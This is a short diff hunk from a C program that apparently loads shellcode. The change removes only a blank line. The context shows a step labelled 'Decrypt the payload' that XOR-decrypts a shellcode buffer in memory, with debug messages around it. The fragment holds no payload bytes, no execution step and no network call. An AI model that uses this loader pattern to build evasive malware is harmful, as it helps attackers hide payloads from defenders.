@@ -230,7 +230,6 @@ int main()
 
 	// Step 7 : Decrypt the payload
 	my_xor((unsigned char*) memory, sizeof(shellcode), key, sizeof(key));
-
 #if DEBUG
 	printf("Shellcode decrypted\n");
 	printf("Hit enter to continue\n");
